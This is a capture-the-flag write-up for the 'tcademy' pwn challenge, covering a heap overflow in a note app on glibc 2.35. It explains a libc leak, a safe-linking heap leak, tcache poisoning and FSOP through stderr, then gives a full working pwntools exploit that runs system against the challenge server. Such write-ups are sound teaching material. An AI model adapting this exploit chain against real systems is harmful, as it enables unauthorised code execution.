# tcademy

**Category:** pwn

---

#### Description

Menu-based note app with 2 slots. `create` allocates `malloc(size)` (0 to 0xf8) and then reads user data, `read` prints the note with `puts`, `delete` frees.

Bug in the read length: For `size == 8` it reads 1 byte, otherwise it reads `size - 8` bytes. For `size < 8` this underflows an unsigned short and becomes a huge read, giving a forward heap overflow from the allocated chunk.

Goal: get code execution on glibc 2.35 with PIE, RELRO, NX, canary, and safe-linking.

#### Solution

1. **Libc leak (unsorted bin fd) using 1-byte clobber + `puts`**
   * Allocate a small chunk and a 0x110 chunk.
   * Free the small chunk, then reallocate it with `size=0` and overflow into the 0x110 chunk header to fake its size as `0x421` (unsorted bin sized) and place fake next chunk headers to satisfy `free` checks.
   * Free that “large” chunk into the unsorted bin.
   * Allocate a `size=8` chunk from it: the program only reads 1 byte, so it overwrites only the low byte of the stale unsorted `fd` pointer. `puts()` then leaks the remaining bytes.
   * Reconstruct the leaked libc page and compute `libc_base` using the fixed relation (Ubuntu glibc 2.35-0ubuntu3.8): `fd_page - libc_base == 0x21b000`.
2. **Heap leak (safe-linking) from two adjacent 0x20 chunks**
   * Free two adjacent 0x20 chunks into tcache.
   * Reallocate both with `size=8` so only 1 byte is written, preserving most of the safe-linked `fd` values in the chunk user data.
   * Leak both values via `puts()`, brute-force the clobbered low bytes, and solve the safe-linking equations.
   * Multiple solutions can exist within the same heap page; in this challenge the first user allocation is consistently at offset `0x2a0` in its heap page (after the `tcache_perthread_struct` chunk), so we select the candidate with that page offset.
3. **Tcache poisoning into `_IO_2_1_stderr_`**
   * From the earlier unsorted remainder, allocate two 0x110 chunks `V` and `W`, free them so `V` is at the head of `tcache[0x110]`.
   * Allocate the adjacent 0x20 chunk with `size=0` and overflow into freed `V`’s tcache `next` pointer, overwriting it with a safe-linked pointer to `_IO_2_1_stderr_` in libc.
   * Next `malloc(0xf8)` returns `V` (we use it for attacker-controlled `_IO_wide_data`), and the following `malloc(0xf8)` returns a chunk overlapping `stderr`, letting us overwrite the `FILE` object.
4. **FSOP on exit (wide stream path)**
   * Overwrite `stderr` with a fake `FILE`:
     * Place the command string at the start so `system(fp)` uses it.
     * Set `_mode=1` and `vtable=_IO_wfile_jumps` to take the wide-stream flush path.
     * Point `_wide_data` to our heap `wide_data` chunk.
     * Set `_lock` to a safe writable address that does not clobber `wide_data->write_ptr/write_base`.
   * Craft `_IO_wide_data` so flush sees pending output (`write_ptr > write_base`) and forces buffer allocation (`buf_base == NULL`), reaching `_IO_wdoallocbuf` and then a function pointer in the wide vtable.
   * Place a fake wide vtable pointer inside `wide_data` such that the vtable slot at `+0x68` is `system`.
   * Trigger `exit`, which flushes `_IO_list_all`, invoking the chain and executing `system("echo;cat /app/flag.txt")`.

Exploit code (used for remote solve and local validation):

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import struct

from pwn import PIPE, STDOUT, context, process, remote


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def u64(b: bytes) -> int:
    return struct.unpack("<Q", b.ljust(8, b"\x00"))[0]


def protect_ptr(pos: int, ptr: int) -> int:
    # glibc safe-linking (PROTECT_PTR): fd = (pos >> 12) ^ ptr
    return ((pos >> 12) ^ ptr) & 0xFFFFFFFFFFFFFFFF


MENU_HDR = b"_____________________________\n"


def choice(io, n: int) -> None:
    io.sendlineafter(b"Choice > ", str(n).encode())


def create(io, idx: int, size: int, data: bytes) -> None:
    choice(io, 1)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Data: ", data)
    io.recvuntil(b"Note created!\n")


def delete(io, idx: int) -> None:
    choice(io, 2)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Note deleted!\n")


def read_note_raw(io, idx: int) -> bytes:
    choice(io, 3)
    io.sendlineafter(b"Index: ", str(idx).encode())
    out = io.recvuntil(MENU_HDR)
    return out[: -len(MENU_HDR)]


def solve_heap_from_leaks(leak0: bytes, leak1: bytes) -> int:
    leak0 = leak0.rstrip(b"\n")
    leak1 = leak1.rstrip(b"\n")

    known_m1 = {i: leak0[i] for i in range(1, len(leak0))}
    known_m2 = {i: leak1[i] for i in range(1, len(leak1))}

    nul_m1 = len(leak0)
    nul_m2 = len(leak1)

    candidates: list[int] = []

    for b0_m1 in range(256):
        m1_bytes = bytearray(8)
        m1_bytes[0] = b0_m1
        for i, v in known_m1.items():
            if i < 8:
                m1_bytes[i] = v
        if 0 <= nul_m1 < 8:
            m1_bytes[nul_m1] = 0
            for j in range(nul_m1 + 1, 8):
                m1_bytes[j] = 0
        m1 = int.from_bytes(m1_bytes, "little")

        for b0_m2 in range(256):
            m2_bytes = bytearray(8)
            m2_bytes[0] = b0_m2
            for i, v in known_m2.items():
                if i < 8:
                    m2_bytes[i] = v
            if 0 <= nul_m2 < 8:
                m2_bytes[nul_m2] = 0
                for j in range(nul_m2 + 1, 8):
                    m2_bytes[j] = 0
            m2 = int.from_bytes(m2_bytes, "little")

            # Leak layout:
            #   free(B), free(C=B+0x20), then allocate C (leak0) then B (leak1)
            #
            # So:
            #   m2 = PROTECT_PTR(B, NULL) = B>>12
            #   m1 = PROTECT_PTR(C, B)    = (C>>12) ^ B, with C=B+0x20
            #
            # Page-boundary edge case: (B+0x20)>>12 can equal B>>12 or B>>12+1.
            for c12 in (m2, (m2 + 1) & 0xFFFFFFFFFFFFFFFF):
                b = m1 ^ c12
                if (b >> 12) != m2:
                    continue
                if ((b + 0x20) >> 12) != c12:
                    continue
                if b & 0xF:
                    continue
                if (b >> 40) == 0:
                    continue
                candidates.append(b)

    if not candidates:
        raise RuntimeError("heap solve failed")

    # Prefer the candidate matching the first-user-chunk offset in this binary/glibc.
    preferred = [b for b in candidates if (b & 0xFFF) == 0x2A0]
    if len(preferred) == 1:
        return preferred[0]

    return candidates[0]


def leak_libc(io) -> int:
    create(io, 0, 8, b"X")
    create(io, 1, 0xF8, b"Y" * 8)
    delete(io, 0)

    payload = bytearray(b"A" * 0x500)
    payload[0x10 : 0x10 + 16] = p64(0) + p64(0x421)
    payload[0x430 : 0x430 + 16] = p64(0) + p64(0x21)
    payload[0x450 : 0x450 + 16] = p64(0) + p64(0x21)

    create(io, 0, 0, bytes(payload))
    delete(io, 1)

    create(io, 1, 8, b"Z")
    leak_line = read_note_raw(io, 1).split(b"\n", 1)[0]
    if not leak_line.startswith(b"Z"):
        raise RuntimeError(f"unexpected libc leak line: {leak_line!r}")

    rest = leak_line[1:]
    if len(rest) < 3:
        raise RuntimeError(f"libc leak too short: {leak_line!r}")
    b = bytearray(8)
    b[0] = 0
    for i in range(min(len(rest), 7)):
        b[1 + i] = rest[i]
    if b[5] == 0:
        b[5] = 0x7F
    fd_page = u64(bytes(b)) & ~0xFFF
    return (fd_page - 0x21B000) & 0xFFFFFFFFFFFFFFFF


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--remote", action="store_true")
    ap.add_argument("--host", default="chall.lac.tf")
    ap.add_argument("--port", type=int, default=31144)
    args = ap.parse_args()

    context.log_level = "error"

    if args.remote:
        io = remote(args.host, args.port)
        cmd = b"echo;cat /app/flag.txt"
    else:
        io = process(
            [
                "./glibc235/ld-linux-x86-64.so.2",
                "--library-path",
                "./glibc235",
                "./attachments/chall",
            ],
            stdin=PIPE,
            stdout=PIPE,
            stderr=STDOUT,
        )
        cmd = b"echo;cat local_flag.txt"

    try:
        libc_base = leak_libc(io)

        # glibc 2.35-0ubuntu3.8 offsets
        SYSTEM_OFF = 0x50D70
        IO_WFILE_JUMPS_OFF = 0x2170C0
        STDERR_OFF = 0x21B6A0

        system_addr = libc_base + SYSTEM_OFF
        wfile_jumps_addr = libc_base + IO_WFILE_JUMPS_OFF
        stderr_addr = libc_base + STDERR_OFF

        # Heap leak from the two adjacent 0x20 chunks.
        delete(io, 0)
        delete(io, 1)
        create(io, 0, 8, b"A")
        leak0 = read_note_raw(io, 0).split(b"\n", 1)[0]
        create(io, 1, 8, b"B")
        leak1 = read_note_raw(io, 1).split(b"\n", 1)[0]

        b_user = solve_heap_from_leaks(leak0, leak1)
        v_user = (b_user + 0x40) & 0xFFFFFFFFFFFFFFFF  # start of the unsorted remainder

        # Phase: poison a 0x110 tcache entry to land an allocation on _IO_2_1_stderr_.
        delete(io, 1)
        delete(io, 0)

        create(io, 0, 0xF8, b"V" * 8)
        create(io, 1, 0xF8, b"W" * 8)

        delete(io, 1)
        delete(io, 0)

        mangled = protect_ptr(v_user, stderr_addr)
        overflow = b"A" * 0x20 + p64(mangled)
        create(io, 0, 0, overflow)
        delete(io, 0)

        # wide_data lives in V.
        wide_data_addr = v_user
        wide_data = bytearray(b"\x00" * 0xF0)
        struct.pack_into("<Q", wide_data, 0x18, 0)  # write_base
        struct.pack_into("<Q", wide_data, 0x20, 1)  # write_ptr
        struct.pack_into("<Q", wide_data, 0x30, 0)  # buf_base (must be NULL)
        struct.pack_into("<Q", wide_data, 0xE0, wide_data_addr + 0x80)  # _wide_vtable
        struct.pack_into("<Q", wide_data, 0xE8, system_addr)  # wide_vtable+0x68 -> system
        create(io, 0, 0xF8, bytes(wide_data))

        # Allocate poisoned -> stderr and write fake FILE there.
        if not cmd or (cmd[0] & 0x2):
            raise ValueError("cmd[0] must have bit1 cleared")
        if len(cmd) >= 0x20:
            raise ValueError("cmd too long (must be <0x20)")

        fake = bytearray(b"\x00" * 0xE0)  # avoid corrupting stdout
        fake[: len(cmd)] = cmd
        fake[len(cmd)] = 0

        buf = wide_data_addr + 0x60
        struct.pack_into("<Q", fake, 0x20, buf)
        struct.pack_into("<Q", fake, 0x28, buf + 1)
        struct.pack_into("<Q", fake, 0x30, buf + 8)
        struct.pack_into("<Q", fake, 0x38, buf)
        struct.pack_into("<Q", fake, 0x40, buf + 8)

        lock_addr = wide_data_addr + 0x40
        struct.pack_into("<Q", fake, 0x88, lock_addr)
        struct.pack_into("<Q", fake, 0xA0, wide_data_addr)
        struct.pack_into("<I", fake, 0xC0, 1)  # _mode > 0
        struct.pack_into("<Q", fake, 0x68, 0)  # _wide_data->buf_base triggers wdoallocbuf
        struct.pack_into("<Q", fake, 0xD8, wfile_jumps_addr)

        create(io, 1, 0xF8, bytes(fake))

        # Trigger exit (flush-all over _IO_list_all).
        choice(io, 4)

        data = io.recvrepeat(5.0)
        m = re.search(rb"lactf\{[^}]+\}", data)
        if not m:
            raise RuntimeError(f"flag not found; tail={data[-400:]!r}")
        print(m.group(0).decode())
        return 0
    finally:
        io.close()


if __name__ == "__main__":
    raise SystemExit(main())
```
